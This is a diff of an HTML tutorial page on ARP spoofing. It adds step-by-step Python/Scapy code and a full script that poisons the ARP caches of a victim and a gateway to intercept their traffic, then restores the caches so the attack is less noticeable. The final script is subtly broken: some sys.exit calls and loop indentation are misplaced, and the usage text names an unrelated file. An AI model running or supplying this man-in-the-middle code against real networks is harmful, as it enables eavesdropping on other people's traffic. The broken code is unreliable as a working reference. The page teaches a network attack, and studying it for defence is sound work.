@@ -430,8 +430,8 @@
 <div class="admonition caution">
 <p class="admonition-title">Messing with ARP</p>
 <ul>
-<li>ARP attacks can potentially mess your LAN configuration. Be very cautious about testing the attacks or runnign tools in production environment(or in any network for that matter)</li>
-<li>Fortunately a mess up at layer 2 will be corrected to orignal state in few minutes. If you do happen to mess up your LAN anyway, take a walk, come back several minutes later, pretending the network was still working when you left. </li>
+<li>ARP attacks can potentially mess your LAN configuration. Be very cautious about testing these attacks/scripts in production environment(or in any network for that matter)</li>
+<li>Fortunately any potential mis-configuration will be corrected to orignal state in few minutes. If you do happen to mess up your LAN, take a walk, come back several minutes later, pretend that the network was still working when you left. </li>
 </ul>
 </div>
 <ul>
@@ -447,7 +447,7 @@
 <ul>
 <li>In the above image, the attacker is telling Alan&rsquo;s box that he has the IP that corresponds to Brian&rsquo;s box and vice versa. By doing this the attacker receives all network traffic going between Alan and Brian. Once the attacker has ARP Spoofed his way between two nodes he can sniff the connection. By ARP Spoofing between a computer and the LAN&rsquo;s gateway an attacker can see all the traffic the computer is sending out and receiving.</li>
 </ul>
-<p><strong>Step I</strong></p>
+<p><strong>Step I- IP forwarding</strong></p>
 <ul>
 <li>Make sure that the kernel IP forwarding is enabled, otherwise our machine will drop all traffic between the hosts we are trying to sniff, causing a denial of service.(&ldquo;IP forwarding&rdquo; is a synonym for &ldquo;routing.&rdquo; It is called &ldquo;kernel IP forwarding&rdquo; because it is a feature of the Linux kernel.)</li>
 </ul>
@@ -457,6 +457,108 @@
 </code></pre>
 
 <p>More on kernel IP forwarding: <a href="http://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding">What is kernel IP forwarding?</a></p>
+<p><strong>Step II - Gather MAC addresses</strong></p>
+<p>In order to create our ARP responses, we&rsquo;ll need the victim and router MAC addresses. We can do this by making ARP requests and returning the result.</p>
+<pre><code class="python">def get_mac(IP):
+    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+    for snd,rcv in ans:
+        return rcv.sprintf(r&quot;%Ether.src%&quot;)
+</code></pre>
+
+<p><strong>Step III - Tricking the Targets</strong></p>
+<p>In this step we are tricking eachmachine into thinking that the other party is our machine. 
+ARP reply to each of the targets telling them that we are the other target, placing ourselves in between them.</p>
+<pre><code class="python">def trick(gm, vm):
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
+</code></pre>
+
+<p><strong>Step III - Un-doing the attack/ Re-ARPing</strong></p>
+<p>It&rsquo;s not enough to trick the machines, once our attack is over, we need to re-assign the target&rsquo;s addresses so they know where to send their information properly. If we don&rsquo;t do this than it will be very obvious that something has happened.</p>
+<pre><code class="python">def reARP():
+    print &quot;\n[*] Restoring Targets...&quot;
+    victimMAC = get_mac(victimIP)
+    gatewayMAC = get_mac(gatewayIP)
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
+        disable_ip_forwarding()
+    print &quot;[*] Shutting Down...&quot;
+    sys.exit(1)
+</code></pre>
+
+<p><strong>Final script</strong></p>
+<pre><code class="python">from scapy.all import *
+import sys
+import os
+import time
+
+
+def help_text():
+    print(&quot;\nUsage:\n python hd_tcp_syn.py network_range\n&quot;)
+    sys.exit()
+
+def enable_ip_forwarding():
+    print &quot;\n[*] Enabling IP Forwarding...\n&quot;
+    os.system(&quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;)
+
+def disable_ip_forwarding():
+    print &quot;[*] Disabling IP Forwarding...&quot;
+    os.system(&quot;echo 0 &gt; /proc/sys/net/ipv4/ip_forward&quot;)
+
+def get_mac(IP):
+    conf.verb = 0
+    ans, unans = srp(Ether(dst = &quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+    for snd,rcv in ans:
+        return rcv.sprintf(r&quot;%Ether.src%&quot;)
+
+def reARP():
+
+    print &quot;\n[*] Restoring Targets...&quot;
+    victimMAC = get_mac(victimIP)
+    gatewayMAC = get_mac(gatewayIP)
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = victimMAC), count = 7)
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = &quot;ff:ff:ff:ff:ff:ff&quot;, hwsrc = gatewayMAC), count = 7)
+    disable_ip_forwarding()
+    print &quot;[*] Shutting Down...&quot;
+    sys.exit(1)
+
+def trick(gm, vm):
+    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
+    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))
+
+def mitm():
+    try:
+        victimMAC = get_mac(victimIP)
+    except Exception:
+        disable_ip_forwarding()
+        print &quot;[!] Couldn't Find Victim MAC Address&quot;
+        print &quot;[!] Exiting...&quot;
+    sys.exit(1)
+    try:
+        gatewayMAC = get_mac(gatewayIP)
+    except Exception:
+        disable_ip_forwarding()
+        print &quot;[!] Couldn't Find Gateway MAC Address&quot;
+    print &quot;[!] Exiting...&quot;
+        sys.exit(1)
+    print &quot;[*] Poisoning Targets...&quot;    
+    while 1:
+    try:
+        trick(gatewayMAC, victimMAC)
+            time.sleep(1.5)
+    except KeyboardInterrupt:
+        reARP()
+        break
+
+if __name__ == '__main__':
+    if len(sys.argv) &lt; 2:
+        help_text()
+    interface = sys.argv[1]
+    victimIP = sys.argv[2]
+    gatewayIP = sys.argv[3] 
+    enable_ip_forwarding()
+    mitm()
+</code></pre>
               
             </div>
           </div>
